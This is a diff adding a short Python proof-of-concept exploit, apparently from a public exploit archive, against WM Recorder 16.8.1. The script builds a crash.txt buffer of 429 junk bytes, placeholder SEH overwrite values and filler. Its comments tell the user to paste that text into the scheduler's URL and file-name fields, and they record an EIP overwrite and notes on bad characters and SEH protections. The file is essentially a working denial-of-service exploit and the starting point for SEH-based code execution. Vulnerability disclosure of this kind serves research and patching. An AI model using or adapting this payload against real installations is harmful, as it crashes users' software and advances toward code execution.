@@ -1,0 +1,37 @@
+#!/usr/bin/python
+
+#
+# Exploit Author: bzyo
+# Twitter: @bzyo_
+# Exploit Title: WM Recorder 16.8.1 - Denial of Service
+# Date: 03-20-2018
+# Vulnerable Software: WM Recorder 16.8.1
+# Vendor Homepage: http://wmrecorder.com/home/
+# Version: 16.8.1
+# Software Link: http://wmrecorder.com/download/wm-recorder/
+# Tested On: Windows 7 x86/x64, Windows 10 x64
+#
+#
+# PoC: generate crash.txt, open app, go to Schedule Recordings, Open Scheduler, paste crash.txt contents in Stream URL, File name and Website URL,
+# change End Recording date to future date, turn scheduler on, select OK
+#
+# app crashes & EIP overwrite;
+# !mona seh > no ppr pointers & !mona seh -all > all aslr/safeseh
+# lots of bad chars including \x90
+#
+
+filename="crash.txt"
+
+junk = "\x41"*429
+
+nseh = "\x42"*4
+
+seh = "\x43"*4
+
+fill = "\x44"*9562
+
+buffer = junk + nseh + seh + fill
+  
+textfile = open(filename , 'w')
+textfile.write(buffer)
+textfile.close()
